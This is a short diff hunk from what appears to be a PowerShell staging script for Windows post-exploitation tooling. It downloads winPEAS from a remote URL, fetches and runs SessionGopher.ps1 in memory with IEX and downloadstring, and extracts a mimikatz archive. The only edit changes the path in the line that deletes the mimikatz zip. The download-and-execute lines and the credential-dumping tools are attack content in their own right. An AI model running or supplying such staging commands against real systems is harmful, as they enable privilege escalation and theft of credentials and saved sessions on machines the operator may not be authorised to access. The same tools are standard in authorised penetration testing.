@@ -28,4 +28,4 @@ iwr $url_1029384756/tools/winPEASany_ofs.exe -OutFile C:/blood/winPEASany_ofs.ex
 IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/SessionGopher.ps1")
 
 Expand-Archive -LiteralPath 'C:/blood/mimikatz.zip' -DestinationPath 'C:/blood/'
-del mimikatz.zip
+del C:/blood/mimikatz.zip
